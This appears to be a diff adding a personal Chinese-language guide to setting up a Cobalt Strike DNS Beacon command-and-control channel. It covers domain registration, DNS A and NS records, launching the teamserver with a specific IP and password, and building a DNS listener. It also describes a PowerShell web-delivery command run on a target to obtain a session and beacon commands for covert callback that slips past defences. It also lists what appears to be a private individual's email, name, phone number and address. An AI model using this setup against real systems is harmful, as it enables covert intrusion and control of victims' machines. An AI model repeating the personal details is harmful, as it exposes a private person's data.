@@ -1,0 +1,169 @@
+
+DNS beacon监听器：形成dns隧道，53端口一般会开启。
+原理：cs服务器向目标发起攻击-->将dns beacon传输器(stager)嵌入目标主机内存-->该dns beacon传输器(stager)运行，其回连下载cs服务器上的DNS beacon传输体(完整的payload)-->当DNS beacon传输体在内存中启动就开始回连cs
+服务器，再执行来自cs服务器的各种任务请求。 其走的是DNS协议，默认53端口，一般都能出网。
+缺点：上线慢，执行命令慢，且只能使用32位payload.
+
+环境：
+1. 一个域名
+2. 安装好cs的vps.
+
+步骤：
+1. 配置A记录(即一般域名或主机名解析到的对应ip)，主机名随意，解析到自己的vps_ip.
+2. CNAME 通常称别名指向；
+3. NS记录：为域名服务器记录。即指定该域名一般由哪个DNS服务器来进行解析，一般NS记录只对子域名生效。
+如a.baidu.com;b.baidu.com.   “优先级”中的数字越小表示级别越高； NS记录优先于A记录。即若一个主机地址同时存在NS记录和A记录，则A记录不生效。 
+
+4.配置NS记录(一个或多个，一般推荐2个)，解析到刚才A记录对应的域名上。
+注：改完，一般需要10分钟或更长时间才能生效。
+
+5. nslookup检测配置是否成功。
+6.上线后，显示黑屏，需要执行checkin，让其回连teamviewer，mode命令设置传输方式或数据通道；mode nds使用
+DNS A记录作为通信通道(仅限DNS Beacon)、mode dns-txt[常用]使用DNS TXT作为通信通道(仅限DNS Beacon),mode dns6使用
+DNS AAAA作为通信通道(仅限DNS Beacon)、mode http使用HTTP作为通信通道。
+注：若53端口被占用，
+A：systemctl stop systemd-resolved
+1. netstat -tlunp | grep 53	查询53端口是否被占用
+2.若被占用，则：
+systemctl stop systemd-resolved	停用 systemd-resolved 服务
+3. 53端口一般就没被占用了.
+
+
+
+国外域名，不实名。
+域名购买推荐：https://sg.godaddy.com/zh/offers/domains/godaddy-com?isc=gennbacn22&countryview=1&currencyType=CNY&utm_source=baidu&utm_medium=cpc&utm_term=%E5%9B%BD%E5%A4%96%E7%9A%84%E5%9F%9F%E5%90%8D%E6%9C%8D%E5%8A%A1%E5%95%86&utm_campaign=zh%2Dcn%5Fdom%5Fsem%5Fni%5Fnb%5Fx%5Fph%5F001&utm_content=%E5%9F%9F%E5%90%8D%E6%9C%8D%E5%8A%A1%E5%95%86&gclid=CNi1p52n2OoCFRIDvAod33gH8w&gclsrc=ds
+
+搜索tesd.space，才9块。
+2845114163@qq.com
+中国香港
+赵  宇轩
++852 65630742
+香港九龙湾国际大厦E座2-206
+邮编 999077
+-->已购买的域名-->管理DNS-->进入https://dcc.godaddy.com/manage/tesd.space/dns-->
+添加完记录一般需等十分钟左右生效。
+
+一般使用winscp传文件[似乎更快]，相当于sftp，也支持scp，也能连接linux. winscp新建会话->高级里配置代理。
+xshell也可以配置代理。xftp新建会话里也有添加代理。
+finalshell.
+
+xshell配置代理连接成功。
+上传cs，并启动。
+
+
+https://my.vultr.com/deploy/
+ubuntu 18.04 x64
+
+vps-ubuntu更新：
+sudo apt-get update
+sudo apt-get install openjdk-11-jdk	将就安装openjdk吧.
+sudo apt install unzip		安装解压软件
+java -version			安装成功
+
+
+53端口被占用：systemctl stop systemd-resolved
+eg：因为自己购买的域名为tesd.space
+
+进入https://dcc.godaddy.com/manage/tesd.space/dns设置：
+A记录	主机：cszqw1any	指向：vps的ip	-->
+添加-->域名服务器-->主机：cszqw2any-->cszqw1any.tesd.space-->再添加一个
+添加-->域名服务器-->主机：cszqw3any-->cszqw1any.tesd.space
+故：自定义的一个A记录、2个NS记录。
+
+C:\Users\z>nslookup cszqw1any.tesd.space	测试成功，返回vps的ip.故A记录没问题。
+C:\Users\z>ping csz1any.tesd.space		一样也会显示ip. 选los angeles的能ping通。
+
+C:\Users\z>nslookup		-->
+> server cszqw1any.tesd.space	-->//即指定A记录的域名。
+解析成功				-->继续输入
+>cszqw2any
+>cszqw3any			测试NS记录，若成功，应该返回0.0.0.0
+
+
+nohup ./teamserver 45.76.67.101 passwdz6 >/dev/null 2>&1 &	使cs在后台运行，默认监听在50050端口.
+本地cs客户端连接成功。
+若连接超时，则通过任务管理器-->进程-->一般是java的，打开文件所在位置，找到一般为java.exe该文件-->
+通过proxifier工具代理该进程即可。
+
+cs客户端连接成功-->创建一个DNS Beacon-->
+dns hosts处写：
+cszqw2any.tesd.space,cszqw3any.tesd.space	//多个则用,分隔.
+dns host(stager)处随便写dns hosts中一个：如cszqw2any.tesd.space
+dns port默认写53或写空也行。保存。
+
+测试：
+C:\Users\z>nslookup
+> server cszqw1any.tesd.space	//设置默认服务器
+
+
+
+
+
+总结：
+对于DNS Beacon，
+1.配置dns和域名。A记录：即该域名对应的ip.  网站https://dcc.godaddy.com/manage/tesd.space/dns默认应该会把
+如cszqw1any.tesd.space:45.76.67.101的映射放到internet DNS服务器上，这样访问该域名时，一级一级找就能找到该ip.  其中A记录添加如下：eg：购买的域名为tesd.space
+类型	名称	             	值		TTL	
+A	cszqw1any	45.76.67.101	1 星期
+
+名称任意，类型A记录，值为对应的vps的ip，TTL即过期时间，一般先设1小时，没问题再设长点。
+一般还会再添加两个NS(即域名服务器)记录：如下：
+类型	名称	             	值			TTL	
+NS	cszqw2any	cszqw1any.tesd.space	1 星期
+NS	cszqw3any	cszqw1any.tesd.space	1 星期
+
+NS记录：为域名服务器记录。即指定该域名一般由哪个DNS服务器来进行解析，一般NS记录只对子域名生效。
+即指明cszqw2any.tesd.space和cszqw3any.tesd.space这两个域名交由cszqw1any.tesd.space域名[或DNS服务器，都是它]来解析，进而找到对应的ip.
+
+2.vps配置：
+查询53端口是否被占用：netstat -tlunp | grep 53
+被占用解决方式：systemctl stop systemd-resolved 再次验证.
+注：53端口默认为DNS查询端口。vps的ip一般选能直接ping通的。
+
+3.等待十分钟左右，验证dns和域名是否配置正确。
+C:\Users\z>nslookup cszqw1any.tesd.space	测试成功，返回vps的ip.故A记录没问题。
+C:\Users\z>ping cszqw1any.tesd.space		一样也会显示ip. 选los angeles的能ping通。
+
+C:\Users\z>nslookup		-->
+> server cszqw1any.tesd.space	-->//即指定A记录的域名。设为默认dns服务器.
+解析成功				-->继续输入
+>cszqw2any.tesd.space
+>cszqw3any.tesd.space		测试NS记录，返回0.0.0.0，故NS记录配置成功. 0.0.0.0理解为能找到对应的ip.
+
+4.vps启动cs服务端：
+先更新：
+vps-ubuntu更新：
+sudo apt-get update
+sudo apt-get install openjdk-11-jdk	将就安装openjdk吧.
+sudo apt install unzip		安装解压软件
+java -version			安装成功
+
+上传cs解压后的二进制文件-->赋予文件权限-->
+nohup ./teamserver 45.76.67.101 passwdz6 >/dev/null 2>&1 &	//使cs在后台运行，默认监听在50050端口.
+本地cs客户端连接成功。
+若连接超时，则通过任务管理器-->进程-->一般是java的，打开文件所在位置，找到一般为java.exe该文件-->
+通过proxifier工具代理该进程即可。
+
+5. 配置并添加一个DNS_Beacon_listener：
+payload->Beacon DNS
+DNS hosts->一般是多个ns记录
+eg：
+dns hosts处写：
+cszqw2any.tesd.space,cszqw3any.tesd.space	//多个则用,分隔.
+
+DNS host(Stager)->一般是DNS hosts中的随便一个ns记录
+dns host(stager)处随便写dns hosts中一个：如cszqw2any.tesd.space
+dns port默认写53或写空也行。保存。
+
+6. scripted web-delivery(S)-->host一般是vps的ip或域名(如：cszqw1any.tesd.space)，port是vps不冲突的任一端口(监听之用)，选择刚才的dns listener-->
+eg:选powershell方式，-->x64或x86一般都行-->复制命令，靶机运行，即可获得session.
+注：因为慢，刚开始应该是灰色-->则右键进入interact-->
+cs让其回连：
+beacon > checkin		强行让其回连teamserver；可以多执行几次。我觉得checkin的原理就是vps收到dns请求后，再主动给靶机发送类似命令的用于连接的数据包。
+beacon > mode dns-txt	改变传输方式；常用dns-txt模式，因为一般更快。
+
+核心：靶机53端口一般能出网，一般易绕过防护(通过伪装为dns查询的方式反连)。
+53端口是dns服务器要开放的，如靶机访问域名->dns服务器，靶机不需要开放53端口。
+listener监听的53端口一般不要改，改了一般获取不到session.
+
+
